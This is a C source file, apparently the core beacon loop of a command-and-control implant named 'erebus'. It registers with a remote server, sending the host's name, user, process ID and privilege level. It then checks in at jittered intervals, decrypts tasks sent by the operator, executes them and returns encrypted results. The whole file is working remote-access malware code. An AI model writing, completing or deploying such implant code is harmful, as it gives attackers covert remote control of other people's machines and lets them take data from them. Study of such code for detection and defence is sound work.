#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "erebus/beacon.h"
#include "erebus/config.h"
#include "erebus/crypto.h"
#include "erebus/pb_c2.h"
#include "erebus/platform.h"
#include "erebus/tasks.h"
#include "erebus/transport.h"

#define EREBUS_MAX_PENDING 32
#define EREBUS_MAX_SLEEP_MS 86400000

typedef struct erebus_state {
    uint8_t           secret[32];
    size_t            secret_len;
    uint8_t           session_key[32];
    int               has_session_key;
    char              session_id[64];
    uint32_t          sleep_ms;
    int               jitter_pct;
    erebus_transport *transport;
    erebus_task_result pending[EREBUS_MAX_PENDING];
    size_t            pending_count;
} erebus_state;

static int erebus_register(erebus_state *st) {
    erebus_register_msg msg;
    memset(&msg, 0, sizeof(msg));
    strncpy(msg.implant_id, EREBUS_IMPLANT_ID, sizeof(msg.implant_id) - 1);
    erebus_get_identity(msg.hostname, sizeof(msg.hostname), msg.username, sizeof(msg.username),
        &msg.pid, msg.integrity_level, sizeof(msg.integrity_level));
    strncpy(msg.os, erebus_os_name(), sizeof(msg.os) - 1);
    strncpy(msg.arch, erebus_arch_name(), sizeof(msg.arch) - 1);
    msg.timestamp = erebus_unix_ms();
    if (!erebus_hmac_sha256(st->secret, st->secret_len,
            (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
        return 0;
    }
    msg.hmac_len = 32;

    uint8_t *wire = NULL;
    size_t wire_len = 0;
    if (!erebus_pb_encode_register(&msg, &wire, &wire_len)) return 0;

    uint8_t *resp = NULL;
    size_t resp_len = 0;
    int ok = erebus_transport_register(st->transport, wire, wire_len, &resp, &resp_len);
    free(wire);
    if (!ok) return 0;

    erebus_register_resp rr;
    if (!erebus_pb_decode_register_resp(resp, resp_len, &rr)) { free(resp); return 0; }
    free(resp);

    if (!rr.success) { erebus_pb_free_register_resp(&rr); return 0; }
    strncpy(st->session_id, rr.session_id, sizeof(st->session_id) - 1);
    erebus_transport_set_session_id(st->transport, st->session_id);
    if (rr.next_checkin_ms > 0) st->sleep_ms = (uint32_t)rr.next_checkin_ms;

    if (rr.encrypted_session_key_len > 0) {
        uint8_t *key = NULL;
        size_t key_len = 0;
        if (erebus_aes_gcm_decrypt(st->secret, rr.encrypted_session_key, rr.encrypted_session_key_len, &key, &key_len) && key_len == 32) {
            memcpy(st->session_key, key, 32);
            st->has_session_key = 1;
        }
        free(key);
    }
    erebus_pb_free_register_resp(&rr);
    return 1;
}

static erebus_beacon_resp *erebus_send_beacon(erebus_state *st) {
    erebus_beacon_msg msg;
    memset(&msg, 0, sizeof(msg));
    strncpy(msg.implant_id, EREBUS_IMPLANT_ID, sizeof(msg.implant_id) - 1);
    strncpy(msg.session_id, st->session_id, sizeof(msg.session_id) - 1);
    msg.timestamp = erebus_unix_ms();
    if (!erebus_hmac_sha256(st->secret, st->secret_len,
            (const uint8_t *)msg.implant_id, strlen(msg.implant_id), msg.timestamp, msg.hmac)) {
        return NULL;
    }
    msg.hmac_len = 32;

    if (st->has_session_key && st->pending_count > 0) {
        uint8_t *payload = NULL;
        size_t payload_len = 0;
        if (erebus_pb_encode_results_payload(st->pending, st->pending_count, &payload, &payload_len)) {
            erebus_aes_gcm_encrypt(st->session_key, payload, payload_len, &msg.encrypted_results, &msg.encrypted_results_len);
            free(payload);
        }
    }

    uint8_t *wire = NULL;
    size_t wire_len = 0;
    if (!erebus_pb_encode_beacon(&msg, &wire, &wire_len)) {
        free(msg.encrypted_results);
        return NULL;
    }
    free(msg.encrypted_results);

    uint8_t *resp = NULL;
    size_t resp_len = 0;
    if (!erebus_transport_beacon(st->transport, wire, wire_len, &resp, &resp_len)) {
        free(wire);
        return NULL;
    }
    free(wire);

    erebus_beacon_resp *br = (erebus_beacon_resp *)calloc(1, sizeof(*br));
    if (!br) { free(resp); return NULL; }
    if (!erebus_pb_decode_beacon_resp(resp, resp_len, br)) {
        free(resp);
        free(br);
        return NULL;
    }
    free(resp);
    return br;
}

static void erebus_free_result(erebus_task_result *r) {
    free(r->data);
    r->data = NULL;
    r->data_len = 0;
}

int erebus_beacon_run(void) {
    if (!erebus_platform_init()) return 1;

    erebus_state st;
    memset(&st, 0, sizeof(st));
    st.sleep_ms = EREBUS_SLEEP_MS > 0 ? (uint32_t)EREBUS_SLEEP_MS : 5000;
    st.jitter_pct = EREBUS_JITTER_PCT;

    if (!erebus_hex_decode(EREBUS_IMPLANT_SECRET, st.secret, sizeof(st.secret), &st.secret_len) || st.secret_len != 32) {
        fprintf(stderr, "erebus: invalid IMPLANT_SECRET (need 32-byte hex)\n");
        return 1;
    }

    const char *tt = EREBUS_TRANSPORT_TYPE[0] ? EREBUS_TRANSPORT_TYPE : "https";
    if (strcmp(tt, "https") == 0 && EREBUS_CA_CERT_PEM[0] == '\0') {
        fprintf(stderr, "erebus: HTTPS requires CA pin (CA_CERT_PATH=.../ca-cert.pem at build)\n");
        return 1;
    }
    if (!erebus_transport_create(tt, &st.transport)) {
        fprintf(stderr, "erebus: transport create failed (type=%s; check CA pin / libs)\n", tt);
        return 1;
    }

    for (int i = 0; i < 10 && !st.session_id[0]; i++) {
        if (erebus_register(&st)) break;
        erebus_sleep_ms(erebus_jitter_ms(st.sleep_ms * (uint32_t)(i + 1), st.jitter_pct));
    }
    if (!st.session_id[0]) {
        fprintf(stderr, "erebus: register failed after retries (callback/CA/HMAC/skew)\n");
        erebus_transport_destroy(st.transport);
        return 1;
    }

    for (;;) {
        erebus_sleep_ms(erebus_jitter_ms(st.sleep_ms, st.jitter_pct));

        erebus_beacon_resp *resp = erebus_send_beacon(&st);
        if (!resp) continue;

        st.pending_count = 0;

        if (resp->terminate) {
            erebus_pb_free_beacon_resp(resp);
            break;
        }
        if (resp->next_checkin_ms > 0)
            st.sleep_ms = (uint32_t)resp->next_checkin_ms;

        /*
         * Task source (match Go implant decryptTasks):
         * - No session key yet: allow plaintext tasks (pre-crypto path).
         * - Session key set: ONLY encrypted_tasks; ignore plaintext field.
         *   Empty/invalid/failed decrypt → execute nothing (fail closed).
         */
        erebus_task *tasks = NULL;
        size_t task_count = 0;
        int own_tasks = 0;

        if (st.has_session_key) {
            if (resp->encrypted_tasks_len > 0) {
                uint8_t *plain = NULL;
                size_t plain_len = 0;
                if (erebus_aes_gcm_decrypt(st.session_key, resp->encrypted_tasks,
                        resp->encrypted_tasks_len, &plain, &plain_len)) {
                    erebus_task *decoded = NULL;
                    size_t decoded_count = 0;
                    if (erebus_pb_decode_tasks_payload(plain, plain_len, &decoded, &decoded_count)) {
                        tasks = decoded;
                        task_count = decoded_count;
                        own_tasks = 1;
                    }
                    free(plain);
                }
            }
            /* Drop any plaintext tasks so free_beacon_resp does not re-execute paths. */
            erebus_pb_free_tasks(resp->tasks, resp->task_count);
            resp->tasks = NULL;
            resp->task_count = 0;
        } else {
            tasks = resp->tasks;
            task_count = resp->task_count;
        }

        for (size_t i = 0; i < task_count; i++) {
            if (tasks[i].task_type == EREBUS_TASK_EXIT) {
                if (own_tasks)
                    erebus_pb_free_tasks(tasks, task_count);
                erebus_pb_free_beacon_resp(resp);
                erebus_transport_destroy(st.transport);
                return 0;
            }
            if (tasks[i].task_type == EREBUS_TASK_SLEEP) {
                erebus_sleep_task sl;
                if (erebus_pb_decode_sleep_task(tasks[i].data, tasks[i].data_len, &sl)) {
                    if (sl.sleep_ms > 0 && sl.sleep_ms <= EREBUS_MAX_SLEEP_MS)
                        st.sleep_ms = (uint32_t)sl.sleep_ms;
                    if (sl.jitter_pct > 0 && sl.jitter_pct <= 100)
                        st.jitter_pct = sl.jitter_pct;
                }
                if (st.pending_count < EREBUS_MAX_PENDING) {
                    erebus_task_result ok = {0};
                    strncpy(ok.task_id, tasks[i].task_id, sizeof(ok.task_id) - 1);
                    ok.success = 1;
                    st.pending[st.pending_count++] = ok;
                }
                continue;
            }

            erebus_task_result tr = erebus_execute_task(&tasks[i]);
            if (st.pending_count < EREBUS_MAX_PENDING) {
                st.pending[st.pending_count] = tr;
                st.pending_count++;
            } else {
                erebus_free_result(&tr);
            }
        }

        if (own_tasks)
            erebus_pb_free_tasks(tasks, task_count);
        erebus_pb_free_beacon_resp(resp);
    }

    for (size_t i = 0; i < st.pending_count; i++)
        erebus_free_result(&st.pending[i]);
    erebus_transport_destroy(st.transport);
    return 0;
}